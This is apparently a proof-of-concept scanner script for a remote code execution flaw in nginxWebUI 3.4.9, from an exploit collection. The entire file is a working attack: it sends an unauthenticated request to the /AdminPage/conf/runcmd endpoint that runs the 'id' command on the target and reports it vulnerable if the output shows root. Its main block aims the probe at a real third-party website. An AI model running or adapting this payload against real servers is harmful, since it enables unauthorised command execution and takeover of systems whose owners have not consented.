import requests
import urllib.parse
import re


def get_info():
    # 漏洞基本信息
    return {
        "Name": "nginx-webui-3.4.9远程代码执行",
        "Attack": False,
        "Script": "nginx-webui_3.4.9RCE.py",
        "Path": "fuck_cve/pocs/nginx-web_ui/nginx-webui_3.4.9.py",
        "version": "3.4.9",
        "about": None,
        "CVE": None
    }


def verify(url):
    # 漏洞验证函数
    result = {
        'Name': 'nginx-webui-3.4.9远程代码执行',
        'Script': 'nginx-webui_3.4.9RCE.py',
        'url': url,
        'Attack': False,
        'vulnerable': False
    }

    timeout = 4
    payload = "/AdminPage/conf/runcmd?cmd=id%26%26echo%20nginx"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
    }
    # 拼接完整url地址
    full_url = urllib.parse.urljoin(url, payload)
    # print(full_url)
    try:
        resp = requests.get(full_url, headers=headers, timeout=timeout, verify=False)
        if re.search("uid=0\(root\)", resp.text):
            result['vulnerable'] = True
            result['verify'] = full_url
            # result['request'] = 'GET'
            # result['cmd'] = "任意命令执行"
            # result['about'] = "https://gitee.com/cym1102/nginxWebUI/releases"
        return result

    except requests.exceptions.RequestException as e:
        # print(e)
        return result





if __name__ == '__main__':
    verify('http://www.baidu.com/')
